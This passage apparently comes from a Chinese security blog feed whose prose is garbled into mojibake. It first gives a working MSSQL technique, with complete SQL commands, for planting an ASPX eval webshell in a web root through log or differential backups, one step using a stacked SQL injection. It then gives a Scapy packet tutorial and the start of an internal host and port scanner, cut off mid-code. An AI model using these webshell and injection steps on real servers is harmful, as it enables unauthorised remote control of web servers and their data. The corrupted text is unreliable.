<li>åˆ›å»ºä¸€å¼ è¡¨ï¼šcmdï¼Œåªæœ‰ä¸€ä¸ª a åˆ—ï¼Œç±»å‹ä¸º image</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table cmd (a image) --</span><br></pre></td></tr></table></figure>

<ul>
<li>å¤‡ä»½è¡¨åˆ°C:\1.bak</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backup log test to disk &#x3D; &#39;c:&#x2F;1.bak&#39; with init --</span><br></pre></td></tr></table></figure>

<ul>
<li>æ’å…¥ä¸€å¥è¯æœ¨é©¬åˆ° cmd è¡¨é‡Œ</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into cmd (a) values (&#39;&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cc&quot;],&quot;unsafe&quot;);%&gt;&#39;)--</span><br></pre></td></tr></table></figure>

<ul>
<li>æŠŠæ“ä½œæ—¥å¿—å¤‡ä»½åˆ°ç½‘ç«™æ ¹ç›®å½•</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backup log test to disk &#x3D; &#39;c:\inetpub\wwwroot\saul.aspx&#39; --</span><br></pre></td></tr></table></figure>

<ul>
<li>æŠŠåˆ›å»ºçš„è¡¨åˆ äº†</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop table cmd--</span><br></pre></td></tr></table></figure>

<h3 id="å·®å¼‚å¤‡ä»½"><a href="#å·®å¼‚å¤‡ä»½" class="headerlink" title="å·®å¼‚å¤‡ä»½"></a>å·®å¼‚å¤‡ä»½</h3><p>å‚è€ƒï¼š</p>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvVW9oZ0NDenYzYVZQUTJjT0dCZ29LUQ==">https://mp.weixin.qq.com/s/UohgCCzv3aVPQ2cOGBgoKQ<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vLXFpbmctL3AvMTA5MTA0NjguaHRtbA==">https://www.cnblogs.com/-qing-/p/10910468.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
<p>åœ¨<code>sql server</code> é‡Œ<code>dbo</code>å’Œ<code>sa</code>æƒé™éƒ½æœ‰å¤‡ä»½æ•°æ®åº“æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ•°æ®åº“å¤‡ä»½æˆ<code>aspx</code>æ–‡ä»¶ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>mssqlserver</code>çš„å¤‡ä»½æ•°æ®åº“åŠŸèƒ½ç”Ÿæˆä¸€ä¸ªç½‘é¡µå°é©¬ã€‚</p>
<p>å¼‚å¤‡ä»½æœ‰å‡ ç‡ä¼šå¯¼è‡´ç½‘ç«™æŒ‚æ‰ï¼å¦‚æœä¸Šé¢çš„<code>LOGå¤‡ä»½</code>æ‹¿shellæˆåŠŸçš„è¯å°±å°½é‡åˆ«ç”¨å·®å¼‚å¤‡ä»½æ‹¿shellè¿™ç§æ–¹æ³•ï¼å…·ä½“ä¸ºå•¥æˆ‘ä¹Ÿä¸çŸ¥é“ã€‚ã€‚ã€‚</p>
<ul>
<li>å¤‡ä»½æ•°æ®åº“</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backup database test to disk &#x3D; &#39;c:\bak.bak&#39;;--</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ›å»ºä¸€å¼ è¡¨</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table [dbo].[test] ([cmd] [image]);--</span><br></pre></td></tr></table></figure>

<ul>
<li>å†™å…¥æ–‡ä»¶åˆ°è¡¨</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;;insert into test(cmd) values(&#39;&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;cc&quot;],&quot;unsafe&quot;);%&gt;&#39;)--</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ›å»ºè„šæœ¬æ–‡ä»¶</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backup database test to disk&#x3D;&#39;c:\inetpub\wwwroot\cc.aspx&#39; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>çŸ¥è¯†æ•´ç†</category>
      </categories>
      <tags>
        <tag>MSSQL</tag>
        <tag>æ€»ç»“</tag>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Scapyå°å·¥å…·</title>
    <url>/posts/d9f224db/</url>
    <content><![CDATA[<p><code>Scapy</code>æ˜¯ä¸€ä¸ªå¯ä»¥è®©ç”¨æˆ·å‘é€ã€ä¾¦å¬å’Œè§£æå¹¶ä¼ªè£…ç½‘ç»œæŠ¥æ–‡çš„Pythonç¨‹åºã€‚è¿™äº›åŠŸèƒ½å¯ä»¥ç”¨äºåˆ¶ä½œä¾¦æµ‹ã€æ‰«æå’Œæ”»å‡»ç½‘ç»œçš„å·¥å…·ã€‚</p>
<p>æ¢è¨€ä¹‹ï¼Œ<code>Scapy</code> æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ“çºµæŠ¥æ–‡çš„äº¤äº’ç¨‹åºã€‚å®ƒå¯ä»¥ä¼ªé€ æˆ–è€…è§£æå¤šç§åè®®çš„æŠ¥æ–‡ï¼Œè¿˜å…·æœ‰å‘é€ã€æ•è·ã€åŒ¹é…è¯·æ±‚å’Œå“åº”è¿™äº›æŠ¥æ–‡ä»¥åŠæ›´å¤šçš„åŠŸèƒ½ã€‚<code>Scapy</code> å¯ä»¥è½»æ¾åœ°åšåˆ°åƒæ‰«æ(scanning)ã€è·¯ç”±è·Ÿè¸ª(tracerouting)ã€æ¢æµ‹(probing)ã€å•å…ƒæµ‹è¯•(unit tests)ã€æ”»å‡»(attacks)å’Œå‘ç°ç½‘ç»œ(network discorvery)è¿™æ ·çš„ä¼ ç»Ÿä»»åŠ¡ã€‚å®ƒå¯ä»¥ä»£æ›¿<code>hping</code>,<code>arpspoof</code>,<code>arp-sk</code>,<code>arping</code>,<code>p0f</code> ç”šè‡³æ˜¯éƒ¨åˆ†çš„<code>Namp</code>,<code>tcpdump</code>å’Œ<code>tshark</code> çš„åŠŸèƒ½ã€‚</p>
<a id="more"></a>

<h1 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h1><p>å‚è€ƒï¼š</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9zY2FweS5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3QvdXNhZ2UuaHRtbCNpY21wLXBpbmc=">https://scapy.readthedocs.io/en/latest/usage.html#icmp-ping<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFpaHVhbGluL3AvMTA3MzA1MTMuaHRtbA==">https://www.cnblogs.com/baihualin/p/10730513.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><code>Scapy</code>  ä¸»è¦åšä¸¤ä»¶äº‹ï¼šå‘é€æŠ¥æ–‡å’Œæ¥æ”¶å›åº”ã€‚æ‚¨å®šä¹‰ä¸€ç³»åˆ—çš„æŠ¥æ–‡ï¼Œå®ƒå‘é€è¿™äº›æŠ¥æ–‡ï¼Œæ”¶åˆ°å›åº”ï¼Œå°†æ”¶åˆ°çš„å›åº”å’Œè¯·æ±‚åŒ¹é…ï¼Œè¿”å›ä¸€ä¸ªå­˜æ”¾ç€(request,  answer)å³(è¯·æ±‚, å›åº”)çš„æŠ¥æ–‡å¯¹(packet couples)çš„åˆ—è¡¨(list)å’Œä¸€ä¸ªæ²¡æœ‰åŒ¹é…çš„æŠ¥æ–‡çš„åˆ—è¡¨(list)ã€‚è¿™æ ·å¯¹äºåƒ<code>Nmap</code>å’Œ<code>hping</code> è¿™æ ·çš„å·¥å…·æœ‰ä¸€ä¸ªå·¨å¤§çš„ä¼˜åŠ¿ï¼šå›åº”æ²¡æœ‰è¢«å‡å°‘ (open/closed/filtered)è€Œæ˜¯å®Œæ•´çš„æŠ¥æ–‡ã€‚</p>
<p><strong>å¯¼å…¥scapyæ–¹å¼ï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>

<h2 id="å¸¸ç”¨åŒ…è§£æ"><a href="#å¸¸ç”¨åŒ…è§£æ" class="headerlink" title="å¸¸ç”¨åŒ…è§£æ"></a>å¸¸ç”¨åŒ…è§£æ</h2><h3 id="SRåŒ…è§£æ"><a href="#SRåŒ…è§£æ" class="headerlink" title="SRåŒ…è§£æ"></a>SRåŒ…è§£æ</h3><p><code>sr(IP(dst=&#39;192.168.1.0/24&#39;)/TCP(dport=(1,65535)), timeout=2)</code></p>
<p>å‘é€ä¸‰å±‚æ•°æ®åŒ…ï¼Œç­‰å¾…æ¥æ”¶ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®åŒ…çš„å“åº”(æ³¨æ„ï¼šå½“ä¾æ¬¡å‘æ¯ä¸ªIPçš„65535ä¸ªç«¯å£å‘é€å®Œæ‰ç®—æ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°ï¼Œè€Œä¸æ˜¯è°ƒç”¨ä¸€æ¬¡åªå‘ä¸€ä¸ªåŒ…ï¼Œä»¥ä¸‹æ‰€æœ‰å‘åŒ…æ–¹å¼éƒ½ä¸ä¹‹ä¸€æ ·)</p>
<ul>
<li>å‘é€ICMPæ•°æ®åŒ…ï¼ŒæŸ¥çœ‹æ¥å—åˆ°çš„æ•°æ®</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reply_packet = sr(IP(dst=<span class="string">&#x27;114.114.114.114&#x27;</span>)/ICMP(), timeout=<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(reply_packet))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">reply_packet</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;Results: TCP:<span class="number">0</span> UDP:<span class="number">0</span> ICMP:<span class="number">1</span> Other:<span class="number">0</span>&gt;, &lt;Unanswered: TCP:<span class="number">0</span> UDP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">0</span>&gt;</span>)</span></span><br></pre></td></tr></table></figure>

<p>è§£æï¼šè¿”å›çš„æ•°æ®åŒ…ä¸º<code>tuple</code>æ ¼å¼ï¼Œä¹Ÿå³æ˜¯å…ƒç»„ã€‚å…ƒç»„å†…ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºæ¥å—åˆ°çš„å“åº”åŒ…ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸ºæ²¡æœ‰æ¥å—åˆ°çš„å“åº”åŒ…ã€‚</p>
<ul>
<li>æŸ¥çœ‹å“åº”åŒ…çš„å†…å®¹</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(reply_packet[<span class="number">0</span>].res)</span><br><span class="line">[(&lt;IP  frag=<span class="number">0</span> proto=icmp dst=<span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span> |&lt;ICMP  |&gt;&gt;, &lt;IP  version=<span class="number">4</span> ihl=<span class="number">5</span> tos=<span class="number">0x0</span> len=<span class="number">28</span> id=<span class="number">57023</span> flags= frag=<span class="number">0</span> ttl=<span class="number">76</span> proto=icmp chksum=<span class="number">0x9083</span> src=<span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span> dst=<span class="number">192.168</span><span class="number">.90</span><span class="number">.17</span> |&lt;ICMP  type=echo-reply code=<span class="number">0</span> chksum=<span class="number">0x1600</span> id=<span class="number">0x0</span> seq=<span class="number">0x0</span> |&lt;Padding  load=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> |&gt;&gt;&gt;)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(reply_packet[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>].fields)</span><br><span class="line">&#123;<span class="string">&#x27;options&#x27;</span>: [], <span class="string">&#x27;version&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;ihl&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;tos&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;len&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;id&#x27;</span>: <span class="number">57023</span>, <span class="string">&#x27;flags&#x27;</span>: &lt;Flag <span class="number">0</span> ()&gt;, <span class="string">&#x27;frag&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;ttl&#x27;</span>: <span class="number">76</span>, <span class="string">&#x27;proto&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;chksum&#x27;</span>: <span class="number">36995</span>, <span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;114.114.114.114&#x27;</span>, <span class="string">&#x27;dst&#x27;</span>: <span class="string">&#x27;192.168.90.17&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æï¼šå¾—åˆ°çš„å“åº”åŒ…æ˜¯ä¸ªåˆ—è¡¨ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºå‘é€çš„æ•°æ®åŒ…ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸ºè¿”å›çš„æ•°æ®åŒ…ã€‚ä½¿ç”¨<code>xx.res[0][1].fields</code>(è¿”å›å­—å…¸)æŸ¥çœ‹è¿”å›åŒ…çš„å…·ä½“å†…å®¹;åŒæ—¶ä¹Ÿå¯ä»¥ç›´æ¥ç”¨show(è¿”å›å­—ç¬¦ä¸²)æ–¹æ³•æŸ¥çœ‹åŒ…ä½“å†…å®¹ã€‚å…¶å®<code>reply_packet[0].res[0][1].fields</code> == <code>reply_packet[0].res[0][1][0].fields</code>,resçš„ç¬¬ä¸‰ä½[0]è¡¨ç¤ºç²¾ç¡®åˆ°ç¬¬å‡ å±‚,è¿™é‡Œ[0]ä»£è¡¨IPå±‚,[1]è¿›ä¸€å±‚åˆ°ä¼ è¾“å±‚,[2]è¿›ä¸€æ­¥åˆ°åº”ç”¨å±‚ã€‚</p>
<h3 id="SR1åŒ…è§£æ"><a href="#SR1åŒ…è§£æ" class="headerlink" title="SR1åŒ…è§£æ"></a>SR1åŒ…è§£æ</h3><p><code>reply_packet = sr1(IP(dst=&#39;114.114.114.114&#39;)/ICMP(), timeout=2)</code></p>
<p>å‘é€ä¸‰å±‚æ•°æ®åŒ…ï¼Œå¹¶ä»…ä»…åªç­‰å¾…æ¥æ”¶ä¸€ä¸ªæ•°æ®åŒ…çš„å“åº”</p>
<ul>
<li>å‘é€ICMPæ•°æ®åŒ…ï¼ŒæŸ¥çœ‹æ¥å—åˆ°çš„æ•°æ®</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reply_packet = sr1(IP(dst=<span class="string">&#x27;114.114.114.114&#x27;</span>)/ICMP(), timeout=<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(reply_packet)</span><br><span class="line"><span class="string">b&#x27;E\x00\x00\x1cu\xb7\x00\x00K\x01\xfa\x8brrrr\xc0\xa8Z\x11\x00\x00\x16\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(reply_packet.fields)</span><br><span class="line">&#123;<span class="string">&#x27;options&#x27;</span>: [], <span class="string">&#x27;version&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;ihl&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;tos&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;len&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;id&#x27;</span>: <span class="number">30135</span>, <span class="string">&#x27;flags&#x27;</span>: &lt;Flag <span class="number">0</span> ()&gt;, <span class="string">&#x27;frag&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;ttl&#x27;</span>: <span class="number">75</span>, <span class="string">&#x27;proto&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;chksum&#x27;</span>: <span class="number">64139</span>, <span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;114.114.114.114&#x27;</span>, <span class="string">&#x27;dst&#x27;</span>: <span class="string">&#x27;192.168.90.17&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æï¼šsr1è¿”å›çš„å¯¹è±¡æ²¡æœ‰å¤ªå¤šå¤æ‚ä¸œè¥¿,ç›´æ¥ç›¸å½“äºsrè¿”å›å¯¹è±¡çš„<code>reply_packet[0].res[0][1]</code>,å¯ä»¥ç†è§£ä¸ºsr1è¿”å›çš„å¯¹è±¡æ˜¯srè¿”å›å¯¹è±¡çš„ä¸€ä¸ªå­é›†ã€‚æ‰€ä»¥å¯ä»¥å’Œsrä¸€æ ·ç›´æ¥ç”¨fieldsæ¥è¯»å–å…¶å†…å®¹ã€‚</p>
<h3 id="SRPåŒ…è§£æ"><a href="#SRPåŒ…è§£æ" class="headerlink" title="SRPåŒ…è§£æ"></a>SRPåŒ…è§£æ</h3><p><code>reply_packet = srp(Ether(dst=&#39;00ff:ff:ff:ff:ff:ff&#39;)/IP(dst=&#39;114.114.114.114&#39;)/ICMP())</code></p>
<p>å‘é€äºŒå±‚æ•°æ®åŒ…ï¼Œå¹¶ä¸”ç­‰å¾…å›åº”(è¿™ä¸ªå‡½æ•°å¯ä»¥ç¼–è¾‘äºŒå±‚å¤´éƒ¨ï¼Œsr()ä¸èƒ½ç¼–è¾‘äºŒå±‚å¤´éƒ¨)</p>
<ul>
<li>å‘é€ICMPæ•°æ®åŒ…ï¼ŒæŸ¥çœ‹æ¥å—åˆ°çš„æ•°æ®</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reply_packet = srp(Ether(dst=<span class="string">&#x27;00ff:ff:ff:ff:ff:ff&#x27;</span>)/IP(dst=<span class="string">&#x27;114.114.114.114&#x27;</span>)/ICMP())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(reply_packet[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>].fields)</span><br><span class="line">&#123;<span class="string">&#x27;dst&#x27;</span>: <span class="string">&#x27;38:f9:d3:bd:38:f6&#x27;</span>, <span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;e8:68:19:42:1a:7d&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="number">2048</span>&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æï¼šè¿™é‡Œé»˜è®¤åªç»™å‡ºäº†äºŒå±‚å¤´éƒ¨,å¯ä»¥é€šè¿‡è°ƒèŠ‚resåç¬¬ä¸‰ä½çš„å€¼æ¥é€‰æ‹©æ€§æŸ¥çœ‹æ¯å±‚ä¿¡æ¯,resçš„ç¬¬ä¸‰ä½[0]è¡¨ç¤ºç²¾ç¡®åˆ°ç¬¬å‡ å±‚,[0]ä»£è¡¨äºŒå±‚,[1]è¿›ä¸€å±‚åˆ°IPå±‚,[2]è¿›ä¸€æ­¥åˆ°ä¼ è¾“å±‚,[3]è¿›ä¸€æ­¥åˆ°åº”ç”¨å±‚</p>
<h2 id="å­˜æ´»ä¸»æœºåŠç«¯å£æ‰«æ"><a href="#å­˜æ´»ä¸»æœºåŠç«¯å£æ‰«æ" class="headerlink" title="å­˜æ´»ä¸»æœºåŠç«¯å£æ‰«æ"></a>å­˜æ´»ä¸»æœºåŠç«¯å£æ‰«æ</h2><p>ä¸»è¦æ˜¯ä¸ºäº†æ¢æµ‹å†…ç½‘å­˜æ´»ä¸»æœºä»¥åŠç«¯å£æ‰«æã€‚ä½¿ç”¨äº†çº¿ç¨‹æ± ï¼Œå°±æ˜¯è§‰å¾—ç®€å•ï¼Œæ²¡è€ƒè™‘å…¶ä»–æƒ…å†µã€‚ã€‚ã€‚</p>
<ul>
<li><p>-i æŒ‡å®šç›®æ ‡åœ°å€ï¼Œ192.168.90.2æˆ–è€…192.168.90.0/24</p>
</li>
<li><p>-t åŒæ—¶æŒ‡å®šçº¿ç¨‹æ± å¤§å°ï¼Œ â€“ta æŒ‡å®šå­˜æ´»ä¸»æœºæ‰«æçº¿ç¨‹æ± ï¼Œâ€“tpæŒ‡å®šç«¯å£æ‰«æçº¿ç¨‹æ± </p>
</li>
<li><p>-p 80,81,88-90,90 æŒ‡å®šæ‰«æçš„ç«¯å£ï¼Œä¸æŒ‡å®šåˆ™ä½¿ç”¨é»˜è®¤ã€‚</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># FileName  :  surhpscan.py</span></span><br><span class="line"><span class="comment"># Time      :  2020/04/15 15:13:28</span></span><br><span class="line"><span class="comment"># Author    :  OuDeNiu</span></span><br><span class="line"><span class="comment"># Email     :  havebutno@gmail.com</span></span><br><span class="line"><span class="comment"># Version   :  1.0</span></span><br><span class="line"><span class="comment"># Descript  :  ä¸»è¦ç”¨äºå†…ç½‘ä¸»æœºæ¢æµ‹(é¦–å…ˆæ¢æµ‹å­˜æ´»ä¸»æœºï¼Œç„¶åå¯¹å­˜æ´»ä¸»æœºç«¯å£æ‰«æ)</span></span><br><span class="line"><span class="comment">#                   å†—ä½™éƒ¨åˆ†ä¸ºæµ‹è¯•ä»£ç ï¼Œï¼Œï¼Œ</span></span><br><span class="line">    <span class="comment"># ä»¥ä¸‹ä¿®æ”¹ä¸ºäº†ç¾åŒ–</span></span><br><span class="line">    <span class="comment"># scapyæ¨¡å—sendrecv.py çš„ SndRcvHandlerç±»   verboseå‚æ•°(æ–‡ä»¶çš„88è¡Œ)ï¼Œä¿®æ”¹ä¸º0</span></span><br><span class="line">        <span class="comment"># if verbose is None:</span></span><br><span class="line">        <span class="comment">#     verbose = 0</span></span><br><span class="line">        <span class="comment">#     # verbose = conf.verb</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> IPy</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore, init</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªåŠ¨é‡ç½®é¢œè‰²</span></span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nscan</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, hosts, threads=None, ta=None, tp=None, inp_port=None</span>):</span></span><br><span class="line">        <span class="comment"># é»˜è®¤æ‰«æçš„ç«¯å£å¥½</span></span><br><span class="line">        self.default_port = [<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">86</span>,<span class="number">87</span>,<span class="number">88</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">95</span>,<span class="number">107</span>,<span class="number">115</span>,<span class="number">135</span>,<span class="number">139</span>,<span class="number">161</span>,<span class="number">174</span>,<span class="number">389</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">444</span>,<span class="number">465</span>,<span class="number">631</span>,<span class="number">636</span>,<span class="number">512</span>,<span class="number">513</span>,<span class="number">751</span>,<span class="number">1080</span>,<span class="number">1081</span>,<span class="number">1082</span>,<span class="number">1083</span>,<span class="number">1084</span>,<span class="number">1085</span>,<span class="number">1086</span>,<span class="number">1087</span>,<span class="number">1088</span>,<span class="number">1089</span>,<span class="number">1090</span>,<span class="number">1433</span>,<span class="number">1434</span>,<span class="number">1521</span>,<span class="number">1527</span>,<span class="number">1534</span>,<span class="number">1649</span>,<span class="number">1985</span>,<span class="number">1997</span>,<span class="number">1999</span>,<span class="number">3306</span>,<span class="number">3389</span>,<span class="number">5000</span>,<span class="number">5357</span>,<span class="number">5432</span>,<span class="number">5698</span>,<span class="number">6379</span>,<span class="number">7001</span>,<span class="number">7002</span>,<span class="number">8000</span>,<span class="number">8001</span>,<span class="number">8002</span>,<span class="number">8003</span>,<span class="number">8004</span>,<span class="number">8005</span>,<span class="number">8006</span>,<span class="number">8007</span>,<span class="number">8008</span>,<span class="number">8009</span>,<span class="number">8010</span>,<span class="number">8011</span>,<span class="number">8012</span>,<span class="number">8013</span>,<span class="number">8080</span>,<span class="number">8081</span>,<span class="number">8082</span>,<span class="number">8083</span>,<span class="number">8084</span>,<span class="number">8090</span>,<span class="number">8091</span>,<span class="number">8092</span>,<span class="number">8093</span>,<span class="number">9092</span>,<span class="number">27017</span>,<span class="number">11211</span>]</span><br><span class="line">        <span class="comment"># å­˜æ”¾æœ€ç»ˆéœ€è¦æ‰«æçš„IP</span></span><br><span class="line">        self.ips = []</span><br><span class="line">        <span class="comment"># å¦‚æœè¾“å…¥ç«¯å£ï¼Œåˆ™å­˜æ”¾æœ€ç»ˆæ‰«æçš„ç«¯å£ï¼Œå¦‚æœä¸å­˜æ”¾åˆ™ä½¿ç”¨é»˜è®¤çš„ç«¯å£å·</span></span><br><span class="line">        self.port_scan = []</span><br><span class="line">        <span class="comment"># æ¥æ”¶å‚æ•°</span></span><br><span class="line">        self.hosts = hosts</span><br><span class="line">        self.inp_port = inp_port</span><br><span class="line">        self.threads = threads</span><br><span class="line">        self.ta = ta</span><br><span class="line">        self.tp = tp</span><br><span class="line">        <span class="comment"># è§£æIPã€çº¿ç¨‹ã€ç«¯å£</span></span><br><span class="line">        self.recv_ip()</span><br><span class="line">        self.recv_thread()</span><br><span class="line">        self.recv_port()</span><br><span class="line">        <span class="comment"># æœ€ç»ˆå­˜æ´»ä¸»æœºçš„IPåœ°å€</span></span><br><span class="line">        self.alive_ip = []</span><br><span class="line">        <span class="comment"># ç«¯å£æ‰«æçš„ç»“æœ å­˜æ”¾æ ¼å¼ä¸ºï¼š    [ [&#x27;IP&#x27;,[port,port,port] , [&#x27;IP&#x27;,[port,port,port]  ]</span></span><br><span class="line">        self.result_port_scan = []</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_thread</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># å¤„ç†ä¼ å…¥çš„çº¿ç¨‹æ± å¤§å°  æœ€åå½¢æˆself.ta(å­˜æ´»ä¸»æœºæ¢æµ‹çº¿ç¨‹æ± )   self.tp(ç«¯å£æ‰«æçº¿ç¨‹æ± )</span></span><br><span class="line">        <span class="keyword">if</span> self.threads <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> self.ta <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                self.ta = <span class="number">10</span></span><br><span class="line">                <span class="keyword">if</span> self.tp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    self.tp = <span class="number">5</span></span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    self.tp = self.tp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.ta = int(self.ta)</span><br><span class="line">                <span class="keyword">if</span> self.tp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    self.tp = <span class="number">5</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.tp = int(self.tp)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.ta = self.tp = int(self.threads)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è§£æIPå¹¶åŠ å…¥åˆ°éœ€è¦æ¢æµ‹çš„ä¸»æœºåˆ—è¡¨ä¸­</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_ip</span>(<span class="params">self</span>):</span></span><br><span class="line">        inp_ips = self.hosts.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="comment"># è®¾ç½®make_net ä¸º1 æ—¶ï¼Œå¯ä»¥è‡ªå®šä¹‰</span></span><br><span class="line">        <span class="keyword">for</span> ips <span class="keyword">in</span> inp_ips:</span><br><span class="line">            ips = IPy.IP(ips, make_net=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">                self.ips.append(str(ip))</span><br><span class="line">        print(Fore.YELLOW + <span 